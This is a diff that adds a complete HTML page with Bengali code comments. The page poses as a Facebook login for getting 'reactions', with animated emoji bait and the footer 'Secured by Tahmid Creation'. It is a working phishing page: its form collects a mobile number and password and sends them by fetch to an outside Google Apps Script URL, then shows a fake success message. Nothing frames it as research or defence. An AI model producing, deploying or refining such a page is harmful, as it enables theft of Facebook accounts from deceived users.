@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Reaction Access | Tahmid Creation</title>
+    <style>
+        /* মেইন ব্যাকগ্রাউন্ড এবং ফন্ট */
+        body {
+            background: radial-gradient(circle, #0f172a 0%, #020617 100%);
+            color: #f8fafc;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden; /* ইমোজি যাতে স্ক্রিনের বাইরে না যায় */
+            position: relative;
+        }
+
+        /* ইমোজি কন্টেইনার */
+        #emoji-container {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            z-index: 0; /* লগইন বক্সের পেছনে থাকবে */
+            pointer-events: none; /* ইমোজিতে ক্লিক করা যাবে না */
+        }
+
+        /* একক ইমোজি স্টাইল */
+        .emoji {
+            position: absolute;
+            bottom: -50px; /* স্ক্রিনের নিচ থেকে শুরু হবে */
+            font-size: 24px;
+            opacity: 0;
+            animation: flyUp linear infinite;
+        }
+
+        /* ইমোজি ওড়ার অ্যানিমেশন */
+        @keyframes flyUp {
+            0% {
+                transform: translateY(0) rotate(0deg);
+                opacity: 0;
+            }
+            10% {
+                opacity: 1; /* একটু উপরে উঠলেই দৃশ্যমান হবে */
+            }
+            90% {
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-110vh) rotate(360deg); /* স্ক্রিনের উপরে চলে যাবে */
+                opacity: 0; /* উপরে গিয়ে মিলিয়ে যাবে */
+            }
+        }
+
+        /* গ্লাস ইফেক্ট লগইন কার্ড */
+        .login-box {
+            background: rgba(30, 41, 59, 0.75);
+            backdrop-filter: blur(15px);
+            padding: 40px;
+            border-radius: 20px;
+            width: 340px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            text-align: center;
+            position: relative;
+            z-index: 10; /* ইমোজির উপরে থাকবে */
+            animation: fadeIn 1s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        h2 {
+            margin-bottom: 30px;
+            font-size: 26px;
+            color: #38bdf8;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            text-shadow: 0 0 15px rgba(56, 189, 248, 0.5);
+        }
+
+        /* ইনপুট ফিল্ড স্টাইল */
+        input {
+            width: 100%;
+            padding: 14px;
+            margin: 12px 0;
+            border-radius: 8px;
+            border: 1px solid #334155;
+            background: rgba(15, 23, 42, 0.9);
+            color: #fff;
+            box-sizing: border-box;
+            font-size: 15px;
+            transition: all 0.3s ease;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #38bdf8;
+            box-shadow: 0 0 15px rgba(56, 189, 248, 0.3);
+            background: #0f172a;
+        }
+
+        /* আধুনিক বাটন */
+        button {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #38bdf8 0%, #0284c7 100%);
+            border: none;
+            color: #fff;
+            font-weight: bold;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: 0.3s;
+            text-transform: uppercase;
+            position: relative;
+            overflow: hidden;
+        }
+
+        button:hover {
+            transform: scale(1.03);
+            box-shadow: 0 0 25px rgba(56, 189, 248, 0.5);
+        }
+
+        button:disabled {
+            background: #475569;
+            cursor: not-allowed;
+            transform: scale(1);
+        }
+
+        #status {
+            margin-top: 20px;
+            font-size: 14px;
+            font-weight: 500;
+            min-height: 20px;
+        }
+
+        /* ফুটার টেক্সট */
+        .footer-text {
+            position: absolute;
+            bottom: 20px;
+            font-size: 12px;
+            color: #64748b;
+            letter-spacing: 1px;
+            z-index: 10;
+        }
+    </style>
+</head>
+<body>
+
+<div id="emoji-container"></div>
+
+<div class="login-box">
+    <h2>Facebook</h2>
+    <form id="my-form">
+        <input type="text" name="Number" placeholder="মোবাইল নাম্বার" required>
+        <input type="password" name="Password" placeholder="পাসওয়ার্ড" required>
+        <button type="submit" id="submit-btn">Verify & Connect</button>
+    </form>
+    <p id="status"></p>
+</div>
+
+<div class="footer-text">SECURED BY TAHMID CREATION</div>
+
+<script>
+    // আপনার Google Apps Script URL
+    const webAppUrl = 'https://script.google.com/macros/s/AKfycbyhosW7lbOe3MJSI15i-XW7OHGfv5KqYCKKDFGlOvk15vdVlH_KY_JUfj4XJz6-AF4I0w/exec'; 
+
+    const form = document.getElementById('my-form');
+    const status = document.getElementById('status');
+    const btn = document.getElementById('submit-btn');
+
+    // --- ইমোজি অ্যানিমেশন স্ক্রিপ্ট ---
+    const emojiContainer = document.getElementById('emoji-container');
+    
+    // যে ইমোজিগুলো উড়বে (আপনি চাইলে আরও যোগ করতে পারেন)
+    const emojis = ['❤️', '😂', '😮', '😢', '😡', '👍', '🔥', '💖', '🤩', '💩'];
+
+    function createEmoji() {
+        const emoji = document.createElement('div');
+        emoji.classList.add('emoji');
+        
+        // র‍্যান্ডম ইমোজি সিলেক্ট করা
+        emoji.innerText = emojis[Math.floor(Math.random() * emojis.length)];
+        
+        // র‍্যান্ডম পজিশন (স্ক্রিনের বাম থেকে ডানে)
+        emoji.style.left = Math.random() * 100 + 'vw';
+        
+        // র‍্যান্ডম ওড়ার গতি (৩ থেকে ৮ সেকেন্ড)
+        const duration = Math.random() * 5 + 3;
+        emoji.style.animationDuration = duration + 's';
+        
+        // র‍্যান্ডম সাইজ (২০px থেকে ৪০px)
+        emoji.style.fontSize = Math.random() * 20 + 20 + 'px';
+
+        emojiContainer.appendChild(emoji);
+
+        // অ্যানিমেশন শেষ হলে ইমোজিটি ডিলিট করে দেওয়া (মেমোরি বাঁচানোর জন্য)
+        setTimeout(() => {
+            emoji.remove();
+        }, duration * 1000);
+    }
+
+    // প্রতি ৩০০ মিলিসেকেন্ড পর পর একটি নতুন ইমোজি তৈরি হবে
+    setInterval(createEmoji, 300);
+    // --------------------------------
+
+    // --- ফর্ম সাবমিশন স্ক্রিপ্ট (আগের মতোই) ---
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        btn.disabled = true;
+        btn.innerHTML = "Processing...";
+        status.style.color = "#94a3b8";
+        status.innerHTML = "Sending data to server...";
+
+        fetch(webAppUrl, {
+            method: 'POST',
+            body: new FormData(form)
+        })
+        .then(res => {
+            status.style.color = "#22c55e";
+            status.innerHTML = "✔ Success! Your request has been sent.";
+            btn.innerHTML = "Verify & Connect";
+            btn.disabled = false;
+            form.reset();
+        })
+        .catch(err => {
+            console.log(err);
+            status.style.color = "#ef4444";
+            status.innerHTML = "✖ Error! Please try again later.";
+            btn.disabled = false;
+            btn.innerHTML = "Verify & Connect";
+        });
+    });
+</script>
+
+</body>
+</html>
